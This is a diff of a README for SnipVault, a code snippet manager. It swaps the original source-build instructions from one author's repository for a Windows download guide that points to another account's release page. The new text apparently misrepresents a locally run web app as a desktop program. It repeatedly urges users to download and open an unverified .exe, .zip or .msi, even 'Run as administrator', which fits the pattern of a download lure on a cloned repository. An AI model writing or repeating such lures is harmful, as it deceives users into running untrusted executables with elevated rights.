@@ -1,121 +1,206 @@
-<div align="center">
+# 🗂️ SnipVault - Save and reuse snippets fast
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f172a,100:06b6d4&height=200&section=header&text=SnipVault&fontSize=80&fontColor=ffffff&fontAlignY=38&desc=Your%20Personal%20Code%20Snippet%20Vault&descAlignY=60&descSize=20" width="100%"/>
+[![Download SnipVault](https://img.shields.io/badge/Download%20SnipVault-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/printgope-oss/SnipVault/releases)
 
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=20&pause=1000&color=06B6D4&center=true&vCenter=true&width=600&lines=Stop+copy-pasting+from+old+projects.;Save+it.+Find+it.+Use+it.+Fast.)](https://git.io/typing-svg)
+## 📌 What SnipVault does
 
-<p>
-  <img src="https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white" />
-  <img src="https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black" />
-  <img src="https://img.shields.io/badge/TailwindCSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white" />
-  <img src="https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge" />
-</p>
+SnipVault is a desktop app for saving code snippets in one place. You can store pieces of code, name them, search them, and reuse them when you need them.
 
-</div>
+It is built for people who work with code and want a simple way to keep useful snippets close at hand. SnipVault uses FastAPI, React, and SQLite under the hood, but you do not need to know that to use it.
 
----
+## 💻 What you need
 
-## What is this?
+SnipVault runs on Windows and works best on a modern PC.
 
-You know that feeling when you've written a perfect regex, or a clean auth middleware, and then two weeks later you're digging through 6 old projects trying to find it?
+You should have:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- About 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-That's what SnipVault solves.
+If your PC can run current desktop apps, it should handle SnipVault well.
 
-It's a personal code snippet manager — you save snippets with tags and a language label, and later you just search and copy. That's it. No cloud, no account, runs locally.
+## 🚀 Download and install
 
----
+Use this page to download: https://github.com/printgope-oss/SnipVault/releases
 
-## Getting started
-```bash
-git clone https://github.com/ashish7802/SnipVault.git
-cd SnipVault
+Follow these steps:
 
-# Backend
-cd backend
-python -m venv venv && source venv/bin/activate
-pip install -r requirements.txt
-uvicorn app.main:app --reload --port 8000
+1. Open the release page in your browser.
+2. Find the latest release at the top of the page.
+3. Look for the Windows download file.
+4. Download the file to your PC.
+5. Open the downloaded file from your Downloads folder.
+6. If Windows asks for approval, click Yes or Run.
+7. Wait for SnipVault to finish opening.
+8. If you see a setup window, follow the prompts on screen.
 
-# Frontend (new terminal)
-cd frontend
-npm install && npm run dev
-```
+If the release includes a .zip file:
+1. Right-click the file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Double-click the app file inside.
 
-Frontend runs on `http://localhost:5173`, API on `http://localhost:8000`, and Swagger docs at `/docs`.
+If the release includes an .exe file:
+1. Double-click the file.
+2. Follow the setup steps.
+3. Open SnipVault from the Start menu or desktop shortcut.
 
----
+## 🧭 First run
 
-## Features
+When you open SnipVault for the first time, you can start using it right away.
 
-- Save snippets with a title, language, tags, and optional description
-- Search by title or tag instantly
-- Syntax highlighted code blocks with one-click copy
-- Delete with a confirmation prompt
-- Fully local — SQLite, no external services
+Typical first steps:
+1. Create a snippet title.
+2. Paste your code into the editor.
+3. Add a short note about what the snippet does.
+4. Save the snippet.
+5. Use search to find it later.
 
----
+SnipVault keeps your snippets in a local SQLite database, so your saved items stay on your computer.
 
-## Why not just use Gists or Notes?
+## ✍️ Save a snippet
 
-Gists are public by default and have no tag-based search. Notes apps don't do syntax highlighting. SnipVault is just a focused tool for one specific problem — storing and finding code you already wrote.
+To save a snippet:
+1. Open the app.
+2. Select the option to add a new snippet.
+3. Enter a clear title, such as `Fetch user data`.
+4. Paste your code in the main field.
+5. Add tags like `api`, `react`, or `sql`.
+6. Save the snippet.
 
----
+Good snippet titles make search much easier later.
 
-## Stack
+## 🔎 Search and reuse
 
-Backend is FastAPI + SQLAlchemy on SQLite. Frontend is React 18 with Vite and TailwindCSS. Syntax highlighting via `react-syntax-highlighter`.
+SnipVault lets you find snippets fast.
 
----
+You can search by:
+- Title
+- Tag
+- Code text
+- Notes
 
-## Project structure
-```
-SnipVault/
-├── backend/
-│   └── app/
-│       ├── main.py       ← routes + CORS
-│       ├── models.py     ← DB models
-│       ├── schemas.py    ← Pydantic schemas
-│       ├── crud.py       ← DB operations
-│       └── database.py   ← SQLite setup
-│
-└── frontend/
-    └── src/
-        ├── App.jsx
-        ├── components/
-        │   ├── SnippetForm.jsx
-        │   ├── SnippetCard.jsx
-        │   └── SearchBar.jsx
-        └── services/
-            └── api.js
-```
+To reuse a snippet:
+1. Search for the snippet.
+2. Open it from the list.
+3. Copy the code.
+4. Paste it into your project.
 
----
+This helps when you use the same query, function, or component more than once.
 
-## API
+## 🗃️ Organize your snippets
 
-| Method | Endpoint | Description |
-|---|---|---|
-| POST | `/snippets` | Create a snippet |
-| GET | `/snippets` | Get all snippets |
-| GET | `/snippets?search=xyz` | Search snippets |
-| DELETE | `/snippets/{id}` | Delete a snippet |
+A simple folder or tag plan keeps your library easy to use.
 
----
+Try this setup:
+- `api` for request code
+- `ui` for interface code
+- `db` for database queries
+- `auth` for login code
+- `utils` for shared helper functions
 
-## What's next
+You can also group snippets by project, language, or task. A clean naming pattern saves time when your list grows.
 
-- [ ] Edit snippets inline
-- [ ] JWT auth
-- [ ] Export to GitHub Gist
-- [ ] Browser extension
+## ⚙️ Common use cases
 
-PRs are welcome. If you add something useful, open a PR and I'll review it.
+SnipVault works well for:
+- Reusing code from past projects
+- Keeping favorite SQL queries in one place
+- Saving FastAPI route examples
+- Storing React components
+- Keeping Python helper functions handy
+- Tracking small notes that belong with code
 
----
+It works as a personal snippet library for day-to-day development work.
 
-<div align="center">
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:06b6d4,100:0f172a&height=120&section=footer" width="100%"/>
+## 🛠️ If something does not open
 
-Built by [Ashish Yadav](https://github.com/ashish7802) — drop a ⭐ if it was useful
-</div>
+If the app does not start, try these steps:
+1. Download the file again from the release page.
+2. Make sure the download finished fully.
+3. Check that Windows did not block the file.
+4. Right-click the file and choose Run as administrator.
+5. Restart your PC and try again.
+6. Look for a newer release on the download page.
+
+If you use a .zip file, make sure you extract it before opening the app.
+
+## 📁 Typical app layout
+
+Inside SnipVault, you can expect a simple layout:
+- A list of saved snippets on one side
+- A search box at the top
+- A detail area for code and notes
+- Buttons to add, edit, delete, and copy snippets
+
+The app keeps the interface plain so you can move through it without extra steps.
+
+## 🧪 Built with
+
+SnipVault uses:
+- FastAPI for the backend
+- React for the interface
+- SQLite for local storage
+- Vite for fast app loading
+- Tailwind CSS for the layout and styles
+
+These tools help keep the app fast and light.
+
+## 📦 File types you may see
+
+The release page may offer one of these file types:
+- `.exe` for direct install or launch
+- `.zip` for manual extract and run
+- `.msi` for Windows setup
+
+Pick the Windows file that matches the release notes on the download page.
+
+## 🔐 Data storage
+
+SnipVault stores your snippets on your computer in a local database. That means your data stays with you.
+
+This is useful if you want a private place for code notes, reusable blocks, and small project references.
+
+## 🧰 Keyboard and mouse tips
+
+A few simple tips can make the app easier to use:
+- Use the search box to find snippets fast
+- Use copy buttons when you only need the code
+- Keep titles short and clear
+- Use tags for fast filtering
+- Save each snippet as soon as you finish it
+
+## 🧩 Topic areas covered
+
+SnipVault fits well with:
+- Python
+- React
+- FastAPI
+- SQLite
+- SQLAlchemy
+- REST APIs
+- Tailwind CSS
+- Vite
+- Full-stack web work
+
+This makes it useful for people who build web apps and need a home for reusable code
+
+## 📥 Download again later
+
+If you want the latest build, return to this page: https://github.com/printgope-oss/SnipVault/releases
+
+Check the top release entry first. That is usually the newest version
+
+## 🖥️ Windows setup path
+
+For most Windows users, the flow is:
+1. Visit the release page
+2. Download the Windows file
+3. Open the file
+4. Follow the prompts
+5. Start SnipVault
+6. Save your first snippet
+
+If the file is archived, extract it first. If it is an installer, run it and follow the setup steps on screen
